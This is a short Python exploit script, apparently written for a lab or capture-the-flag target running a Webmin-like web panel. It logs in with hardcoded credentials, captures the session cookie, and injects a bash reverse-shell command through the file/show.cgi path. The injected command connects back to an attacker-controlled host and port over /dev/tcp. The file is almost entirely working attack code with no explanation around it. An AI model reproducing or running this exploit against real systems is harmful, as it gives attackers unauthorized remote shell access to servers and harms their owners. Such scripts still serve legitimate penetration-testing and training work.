#!/usr/bin/env python

import requests
from art import * 
import string
import random

tprint("Zubr", font="larry3d")

RHOST = "10.10.38.59"  # possibly needs change 
RPORT = 80  # possibly needs change
LHOST = "10.11.25.211"  # possibly needs change
LPORT = 4444

url = f"http://{RHOST}/session_login.cgi" # possibly needs change 
data = {"page" : "%2f", "user" : "user1", "pass" : "1user"} # possibly needs change

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)



if r.status_code == 302 and r.cookies["sid"] != None:
    print("[+] Login successful, executing payload ...")
else: 
    print("[-] Login failed ...")

sid = r.cookies["sid"]


def rand():
    return "".join(random.choices(string.ascii_letters + string.digits, k=5))

def payload():
    payload = f"bash -c 'exec bash -i &>/dev/tcp/{LHOST}/{LPORT}<&1'"
    return payload


exp = f"http://{RHOST}/file/show.cgi/bin/{rand()}|{payload()}|"


req = requests.post(exp, cookies={"sid" : sid}, verify=False, allow_redirects=False)